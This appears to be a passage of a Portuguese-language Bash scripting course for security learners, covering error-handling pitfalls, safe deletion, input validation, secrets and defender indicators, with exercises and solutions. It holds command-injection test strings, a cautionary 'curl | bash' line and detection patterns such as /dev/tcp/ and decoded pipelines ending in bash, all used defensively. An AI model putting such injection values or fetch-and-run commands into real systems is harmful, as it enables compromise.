+`local x=$(comando)` **não** para quando o comando falha, porque o código que conta é o do
+`local`, que deu certo. Saída real:
+
+```console
+$ bash -c 'set -e; f() { local x=$(false); echo "local engoliu: rc do local = $?"; }; f'
+local engoliu: rc do local = 0
+$ bash -c 'set -e; f() { local x; x=$(false); echo nunca; }; f'; echo "separado: rc=$?"
+separado: rc=1
+```
+
+Declare e atribua em linhas separadas.
+
+**Código 141 com `pipefail` e `head`.** O `head -n 1` lê uma linha e termina; quem ainda
+estava escrevendo no pipe recebe o sinal <GlossaryTerm term="SIGPIPE">SIGPIPE</GlossaryTerm>
+e morre com 128 + 13 = 141. Sem `pipefail` ninguém percebe; com ele, o pipeline "falha"
+(saída real):
+
+```console
+$ bash -c 'set -o pipefail; seq 1 100000 | head -n 1; echo "codigo: $?"'
+1
+codigo: 141
+```
+
+Com saídas pequenas (como as do `sort` da Missão 3), o escritor termina antes do `head`
+fechar e isso não acontece. Com saídas grandes, trate o caso: ou não use `head` depois
+de algo grande, ou aceite explicitamente o 141.
+
+**O `read` pegou o campo errado.** No formato `-oG`, o subcampo *owner* (vazio) vem antes
+do serviço: em `21/open/tcp//ftp///`, separando por `/`, os campos são `21`, `open`,
+`tcp`, vazio e `ftp`. Ao escrever o exercício extra 3, um `read -r port state _ svc _`
+pegou o campo vazio e o Bash respondeu `bad array subscript`. Conte os separadores com
+calma, ou imprima os campos com `echo "[$port][$state][$proto][$owner][$svc]"` antes de
+usar.
+
+**Script `sh` usando recursos do Bash.** `[[: not found`, `Syntax error: "(" unexpected`
+(de um array) ou `Bad substitution` são sinais de que o `/bin/sh` (dash) está lendo um
+script escrito para o Bash. Corrija o shebang (seção 6.6).
+
+**Quando não sabe o que está errado:** `bash -n script.sh` para a sintaxe, `bash -x
+script.sh` para ver cada comando expandido, `shellcheck script.sh` para os padrões
+perigosos e um `echo "[$variavel]"` para ver espaços escondidos.
+
+## 8. Boas práticas e segurança
+
+### 8.1 O cabeçalho e as aspas
+
+Todo script deste módulo começa igual, e os seus também deveriam:
+
+```bash
+#!/usr/bin/env bash      # ou #!/bin/bash, se o script rodar como root
+set -euo pipefail
+```
+
+E segue a regra da seção 2.2: **toda expansão entre aspas duplas** (`"$var"`, `"$@"`,
+`"$(comando)"`, `"${array[@]}"`), a não ser que você queira o word splitting e saiba
+por quê. Para arquivos, deixe o glob listar (`"$dir"/*.log`), nunca o `ls`.
+
+### 8.2 Apagar e alterar com segurança
+
+Os casos do Bumblebee e do Steam mostram que o `rm` é o comando mais perigoso de um
+script. A forma insegura e a segura, lado a lado:
+
+```bash
+# Inseguro: variável vazia vira "rm -rf /*"; nome começando com - vira opção.
+rm -rf $BUILD_DIR/*
+
+# Seguro: aborta se a variável estiver vazia; aspas; -- antes dos nomes.
+rm -rf -- "${BUILD_DIR:?}/"*
+```
+
+Antes de rodar algo destrutivo pela primeira vez, troque o `rm` por um `echo rm` e veja
+o que seria apagado. E teste o script como usuário comum, num ambiente descartável (o
+sandbox existe para isso), antes de rodá-lo como root.
+
+### 8.3 Dados de fora são dados, não código
+
+- **Nunca use `eval`** com nada que venha de fora (argumentos, arquivos, variáveis de
+  ambiente, rede). Quase sempre existe uma alternativa: arrays para montar comandos,
+  `case` para escolher ações, `printf -v` para criar texto.
+- **Monte comandos com arrays, não com texto.** Em vez de `cmd="nmap -p $portas $alvo";
+  $cmd`, use `cmd=(nmap -p "$portas" "$alvo"); "${cmd[@]}"`: cada item é um argumento e
+  nada é relido pelo shell.
+- **Valide com allowlist.** Defina o que é aceito e recuse todo o resto, como na versão
+  segura do `checar-host.sh` (saída real):
+
+```bash
+#!/usr/bin/env bash
+set -euo pipefail
+alvo=${1:?uso: $0 IPv4}
+if [[ ! $alvo =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+    echo "erro: '$alvo' não parece um IPv4" >&2
+    exit 2
+fi
+echo "Testando o host $alvo"
+```
+
+```console
+$ ./checar-host-seguro.sh 192.168.0.10
+Testando o host 192.168.0.10
+$ ./checar-host-seguro.sh '192.168.0.10; id'; echo "rc=$?"
+erro: '192.168.0.10; id' não parece um IPv4
+rc=2
+```
+
+  Essa regex é uma <GlossaryTerm term="allowlist">allowlist</GlossaryTerm> de formato
+  (só dígitos e pontos, no lugar certo), mas ainda aceitaria `192.168.0.300`. Validar o
+  significado (cada octeto até 255) é o exercício extra 2 da seção 9.
+- **Use `--`** antes de nomes de arquivo e argumentos vindos de fora (`grep -- "$padrao"
+  "$arquivo"`), ou `./*` em vez de `*`, contra a argument injection da seção 3.5.
+
+### 8.4 Temporários, permissões e segredos
+
+- Temporários com `mktemp` e limpeza com `trap ... EXIT` (seção 2.7), nunca nomes fixos
+  em `/tmp`.
+- Scripts que geram relatórios com dados sensíveis podem começar com `umask 077`, para
+  que todo arquivo criado nasça legível só pelo dono (a
+  <GlossaryTerm term="umask">umask</GlossaryTerm> do 0.3).
+- **Segredos fora do script.** Senhas e <GlossaryTerm term="token">tokens</GlossaryTerm>
+  escritos no código acabam no git, no histórico e em backups. Leia de uma variável de
+  ambiente ou de um arquivo com permissão `600`, e falhe com `${TOKEN:?}` se não houver.
+  Evite passar segredos como argumento de comando: qualquer usuário da máquina vê os
+  argumentos dos processos com `ps` (0.4).
+- Scripts executados por root (no cron, por exemplo) e todas as pastas no caminho até
+  eles devem pertencer ao root e não podem ser graváveis por outros usuários. Se um
+  usuário comum pode editar o script, ele pode virar root na próxima execução, num
+  exemplo clássico de violação do <GlossaryTerm term="least privilege">menor privilégio</GlossaryTerm>.
+
+### 8.5 Revisar antes de rodar
+
+- Rode `shellcheck` em todo script antes de usá-lo de verdade, e trate os avisos como
+  erros até entender cada um.
+- Não execute scripts que você não leu, principalmente com `curl ... | bash` (0.3). Baixe
+  para um arquivo, leia, confira o <GlossaryTerm term="checksum">checksum</GlossaryTerm>
+  se o fornecedor publicar, e só então rode.
+- Desconfie de qualquer pipeline que decodifica algo e termina em `| bash` ou `| sh`:
+  foi exatamente o formato dos estágios do xz.
+- `source` só em arquivos em que você confia: tudo ali roda no seu shell, com os seus
+  privilégios.
+
+### 8.6 O olhar de quem defende
+
+Para um defensor, scripts de shell são ao mesmo tempo ferramenta e evidência:
+
+- **Onde procurar scripts maliciosos:** crontabs (`crontab -l` de cada usuário,
+  `/etc/crontab`, `/etc/cron.*`), arquivos de inicialização do shell (`~/.bashrc`,
+  `~/.profile`), unidades do systemd (0.4) e arquivos `.sh` em `/tmp`, `/dev/shm` e
+  `/var/tmp`.
+- **O que denuncia:** pipelines com `base64 -d`, `xz -d` ou `tr` terminando em `| bash`;
+  `/dev/tcp/` em scripts que não deveriam abrir conexões; downloads com `curl` ou `wget`
+  seguidos de `chmod +x`.
+- **Logs como os da Missão 3** são a outra metade: uma triagem de 404 por IP, por user
+  agent e por intervalo de tempo encontra varreduras automatizadas em segundos. O mesmo
+  script que um pentester usa para entender a própria varredura, um defensor usa para
+  achar a do atacante.
+
+## 9. Exercícios
+
+As três flags da seção 5 são as tarefas oficiais deste módulo. Antes de seguir, confira a
+teoria com o quiz e, se quiser fixar mais, faça os exercícios práticos extras no sandbox.
+
+<Quiz task="quiz-final" />
+
+### Cenários para pensar
+
+Os três cenários abaixo são inventados para treinar o raciocínio; não são casos reais.
+Pense na sua resposta antes de abrir a discussão.
+
+<Callout variant="hypothetical" title="o backup das 3h">
+Num pentest autorizado, você tem uma shell como usuário comum num servidor. Encontra no
+`/etc/crontab` uma linha que roda, todo dia às 3h, como root, o script
+`/opt/backup/backup.sh`. O script faz `cd /var/www/uploads && tar czf /backup/site.tgz *`.
+A pasta `uploads` recebe arquivos enviados pelos usuários do site. Qual é o risco, e o
+que você recomendaria no relatório?
+</Callout>
+
+<Solution title="Discussão do cenário a">
+O `*` é expandido pelo shell do root numa pasta onde usuários do site podem criar
+arquivos. Arquivos com nomes que começam com `-` viram opções do `tar` (a argument
+injection da seção 3.5, descrita no artigo de 2014 da DefenseCode), e algumas opções do
+`tar` executam comandos. Seria uma escalação de privilégios para root. No pentest, o
+achado se documenta mostrando a configuração e o risco; explorar só se estiver no escopo
+combinado. Recomendações: usar `tar czf /backup/site.tgz -- ./*` ou, melhor, passar o
+diretório (`tar czf /backup/site.tgz -C /var/www uploads`), sem curinga; e rodar o
+backup com um usuário próprio, sem privilégios de root, que só leia a pasta.
+</Solution>
+
+<Callout variant="hypothetical" title="o script que veio do fórum">
+Um colega achou num fórum um script de 300 linhas que "automatiza todo o recon" e quer
+rodá-lo na rede do cliente amanhã. O script tem `eval` em vários lugares e uma linha
+`curl -s http://.../update.sh | bash` no começo. O que você faz?
+</Callout>
+
+<Solution title="Discussão do cenário b">
+Não roda assim. A linha do `curl | bash` baixa e executa, a cada execução, um código que
+ninguém leu, de um servidor que ninguém controla, possivelmente sem HTTPS: quem controlar
+esse servidor executa o que quiser na sua máquina, que está dentro da rede do cliente. Os
+`eval`s são possíveis pontos de command injection, se o script processar dados vindos dos
+alvos (banners, nomes de host). O caminho: ler o script, remover a autoatualização, rodar
+o ShellCheck, testar num ambiente de laboratório e, no fim, decidir se vale mais adaptar
+ou escrever uma versão menor que vocês entendam. Usar uma ferramenta desconhecida na rede
+do cliente também pode sair do escopo combinado.
+</Solution>
+
+<Callout variant="hypothetical" title="o alerta que não chegou">
+Um script de monitoramento roda no cron a cada 5 minutos: `curl -s https://site/saude |
+grep -q OK || enviar_alerta`. O site caiu durante a madrugada, e nenhum alerta foi
+enviado. Ao investigar, você descobre que o `curl` devolvia erro de conexão. Por que o
+alerta não saiu? Como você reescreveria?
+</Callout>
+
+<Solution title="Discussão do cenário c">
+Pela lógica, um `curl` que falha não imprime `OK`, o `grep -q` falha e o alerta deveria
+sair. Então vale investigar o ambiente do cron: ele roda com um `PATH` mínimo (0.4) e sem
+as variáveis da sua sessão, então `enviar_alerta` (uma função ou script da sua sessão)
+provavelmente nem existia ali: o comando falhou com `command not found`, e o erro foi
+para um stderr que ninguém lia. Lições: no cron, use caminhos absolutos; redirecione a
+saída e os erros para um log (`>> /var/log/saude.log 2>&1`); e torne o teste explícito:
+`curl -fsS --max-time 10 https://site/saude | grep -q OK` com `set -o pipefail`, para que
+o `-f` (que faz o `curl` falhar em erros HTTP) também conte. E teste o alerta de propósito,
+derrubando o serviço num ambiente de teste: um alarme que nunca foi testado não é um alarme.
+</Solution>
+
+### Exercícios práticos extras (sem flag)
+
+1. Faça o `top404.sh` corrigido aceitar uma opção `-n N` (com `getopts`) para mostrar os
+   N primeiros IPs em vez de só um. Qual é o segundo colocado?
+2. Escreva o `alvos.sh`, que lê um arquivo de alvos, ignora comentários (`#` até o fim
+   da linha) e linhas vazias, e imprime só os IPv4 válidos (cada octeto de 0 a 255),
+   avisando no stderr o que ignorou. Teste com esta lista:
+
+```bash
+cat > lista.txt <<'FIM'
+# alvos autorizados (escopo FICTÍCIO do exercício)
+192.168.0.10
+192.168.0.300
+
+   10.0.0.5   # servidor de arquivos
+abc.def.ghi.jkl
+192.168.0.23;id
+198.51.100.7
+FIM
+```
+
+3. Com um array associativo, conte quantas portas abertas existem de cada **serviço** na
+   varredura. Qual é o serviço mais comum? A soma de todas as contagens deve bater com
+   o número de portas da Missão 1.
+4. Descubra a janela de tempo da varredura de diretórios no log de setembro: o horário
+   da primeira e da última requisição do IP atacante. Quanto tempo ela durou?
+
+<Solution title="Soluções dos exercícios extras">
+**1.** Com `getopts ':n:'`, guarde o valor em `top=$OPTARG` (padrão 1), faça
+`shift $((OPTIND - 1))` e troque `head -n 1` por `head -n "$top"`. O segundo colocado é
+o 198.51.100.23, com 84 respostas 404: um verificador de links (`LinkChecker/10.2`)
+procurando páginas antigas de catálogo. Um falso suspeito: ruído legítimo, não ataque.
+
+**2.** Uma solução (saída real):
+
+```bash
+#!/usr/bin/env bash
+# alvos.sh — lê uma lista de alvos e imprime só os IPv4 válidos.
+set -euo pipefail
+
+valid_ipv4() {
+    local ip=$1 octet
+    [[ $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
+    IFS=. read -r -a octets <<< "$ip"
+    for octet in "${octets[@]}"; do
+        (( 10#$octet <= 255 )) || return 1
+    done
+}
+
+list=${1:?uso: $0 ARQUIVO_DE_ALVOS}
+while IFS= read -r line || [ -n "$line" ]; do
+    line=${line%%#*}                     # tira comentários
+    line=${line//[[:space:]]/}           # tira espaços e tabs
+    [ -n "$line" ] || continue           # pula linhas vazias
+    if valid_ipv4 "$line"; then
+        echo "$line"
+    else
+        echo "ignorado: '$line'" >&2
+    fi
+done < "$list"
+```
+
+```console
+$ bash alvos.sh lista.txt
+192.168.0.10
+ignorado: '192.168.0.300'
+10.0.0.5
+ignorado: 'abc.def.ghi.jkl'
+ignorado: '192.168.0.23;id'
+198.51.100.7
+```
+
+O `10#` força a base 10 (sem ele, um octeto como `08` seria lido como octal e daria
+erro). O `|| [ -n "$line" ]` processa a última linha mesmo que o arquivo não termine com
+quebra de linha. E `read -a` lê os pedaços direto num array.
+
+**3.** Uma solução:
+
+```bash
+#!/usr/bin/env bash
+# servicos.sh — conta quantas portas abertas há de cada serviço.
+set -euo pipefail
+scan_file=${1:?uso: $0 ARQUIVO.gnmap}
+declare -A count=()
+while IFS=/ read -r port state proto owner service _; do
+    [ "$state" = open ] || continue
+    count[$service]=$(( ${count[$service]:-0} + 1 ))
+done < <(grep 'Ports:' "$scan_file" | cut -f2 | sed 's/^Ports: //; s/, /\n/g')
+for service in "${!count[@]}"; do
+    printf '%3d %s\n' "${count[$service]}" "$service"
+done | sort -rn
+```
+
+O mais comum é o `http-proxy` (a porta 8080), com 13. Repare no `read`: o subcampo vazio
+`owner` precisa de uma variável própria (seção 7). E o laço usa `< <(...)`, não um pipe,
+porque o array precisa sobreviver ao `while` (seção 6.3).
+
+**4.** `grep '^203.0.113.45 ' "logs/acesso 2024-09.log" | awk '{print $4}' | sed -n '1p;$p'`
+mostra a primeira e a última data: de 23:15:45 a 23:16:51 do dia 6 de setembro, cerca de
+um minuto para 135 requisições. Repare nas aspas em volta do nome do log: sem elas, o
+espaço quebraria o nome, como na Missão 3. (O mesmo IP já tinha feito uma rajada menor,
+de 30 requisições, em 10 de agosto: `grep -c` no log de agosto mostra.)
+</Solution>
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- Um script é uma sequência de comandos lida pelo **mesmo Bash** do prompt. O
+  **shebang** diz ao kernel quem interpreta; `chmod +x` permite executar; executar roda
+  num processo filho, e `source` roda no shell atual.
+- Antes de executar uma linha, o Bash faz as **expansões** numa ordem fixa. O **word
+  splitting** e os **globs** só agem fora das aspas duplas: por isso **toda expansão vai
+  entre aspas** (`"$var"`, `"$@"`), e arquivos se listam com glob, nunca com `ls`.
+- No shell, `if` e `while` testam **códigos de saída** (0 é verdadeiro). `[ ]` e `[[ ]]`
+  testam arquivos, textos e números; `case` decide entre padrões.
+- Linhas se leem com `while IFS= read -r`; funções devolvem códigos com `return` e textos
+  pelo stdout; variáveis de função levam `local`.
+- `set -euo pipefail` torna os erros visíveis, mas tem **pontos cegos** (`if`, `&&`,
+  `||`, pipelines, `local x=$(...)`). `trap ... EXIT` limpa; `mktemp` cria temporários
+  seguros; `bash -x` mostra o que rodou.
+- Scripts automatizam o **recon** (varredura vira URLs) e a **triagem de logs** (404 por
+  IP), e emitir uma linha por resultado os torna combináveis.
+- Dado nunca vira código: sem `eval`, com aspas, com validação por allowlist e `--` antes
+  de nomes. O **ShellCheck** pega padrões perigosos, mas não erros de lógica: teste com
+  dados reais.
+- Um espaço (Bumblebee) ou uma variável vazia (Steam) num script de root bastam para
+  destruir um sistema; um pipeline ofuscado terminando em `| bash` bastou para esconder
+  um backdoor (xz).
+
+### Cola rápida
+
+| Tarefa | Como |
+|---|---|
+| Cabeçalho | `#!/usr/bin/env bash` · `set -euo pipefail` |
+| Variável e uso seguro | `alvo="192.168.0.10"` · `"$alvo"` · `"${alvo}"` |
+| Padrão, obrigatória, recortes | `${v:-padrão}` · `${v:?erro}` · `${v#pre}` · `${v%%suf}` · `${v//a/b}` |
+| Argumentos | `$1` · `$#` · `"$@"` · `shift` · `getopts` |
+| Saída de comando, conta | `x=$(comando)` · `$(( a + b ))` |
+| Testes | `[ -f "$a" ]` · `[ -z "$s" ]` · `[ "$n" -gt 3 ]` · `[[ $s =~ regex ]]` |
+| Decisão | `if cmd; then ...; elif ...; else ...; fi` · `case $x in a) ...;; esac` |
+| Arquivos e linhas | `for f in "$dir"/*.log` · `while IFS= read -r l; do ...; done < arq` |
+| Campos | `IFS=/ read -r a b resto` · `awk '{print $1}'` · `cut -f2` |
+| Função | `nome() { local x=$1; ...; return 0; }` |
+| Robustez | `trap '...' EXIT` · `tmp=$(mktemp)` · `rm -rf -- "${d:?}/"*` |
+| Depurar | `bash -n` · `bash -x` · `shellcheck` · `echo "[$v]"` |
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [Manual do GNU Bash](https://www.gnu.org/software/bash/manual/bash.html) — a referência
+  oficial; as seções *Shell Expansions* e *The Set Builtin* são as mais úteis depois deste
+  módulo (em inglês). O mesmo texto está no `man bash` do seu sistema.
+- [BashGuide e BashPitfalls, da Greg's Wiki](https://mywiki.wooledge.org/BashGuide) —
+  guia e lista de armadilhas comuns, mantidos pela comunidade do canal #bash (em inglês).
+- [Wiki do ShellCheck](https://www.shellcheck.net/wiki/) — cada código (SC2086, SC2045...)
+  com a explicação do problema e a correção (em inglês).
+- [Documentação do nmap sobre a saída grepable](https://nmap.org/book/output-formats-grepable-output.html)
+  e [sobre logs do Apache](https://httpd.apache.org/docs/2.4/logs.html) — os formatos
+  usados nas missões (em inglês).
+- [MITRE ATT&CK T1059.004](https://attack.mitre.org/techniques/T1059/004/) — exemplos
+  reais de uso do shell por grupos de ataque (em inglês).
+- [OverTheWire: Bandit](https://overthewire.org/wargames/bandit/) — os níveis do meio
+  em diante pedem pequenos scripts. (Roda num servidor público, fora da plataforma: lá,
+  as regras do jogo são a sua autorização.)
+
+**O que vem a seguir:** o módulo 0.7, "Scripting: Python para segurança", leva a mesma
+ideia para uma linguagem de propósito geral: requisições HTTP, sockets e parsing de
+saídas mais complexas, onde o Bash começa a ficar apertado.
